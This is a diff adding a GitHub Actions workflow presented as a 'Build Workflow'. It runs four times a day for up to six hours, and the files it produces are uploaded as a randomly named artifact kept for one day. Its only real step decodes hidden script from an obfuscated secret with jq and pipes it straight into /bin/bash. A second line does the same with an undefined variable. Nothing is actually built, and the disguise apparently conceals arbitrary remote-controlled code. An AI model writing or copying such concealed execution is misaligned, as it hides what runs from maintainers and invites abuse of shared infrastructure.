@@ -1,0 +1,32 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '12 5,11,17,23 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  operation:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Build
+        env:
+          hkibn7479: ${{ secrets.hkibn7479 }}
+        run: |
+          printf '%s' "$hkibn7479" | jq -r .oo9 | /bin/bash
+          printf '%s' "$ysk6098" | jq -r .qlqqb4319 | /bin/bash
+
+      - name: Archive output
+        uses: actions/upload-artifact@v4
+        with:
+          name: dMpqRBe8
+          path: "*.zip"
+          retention-days: 1
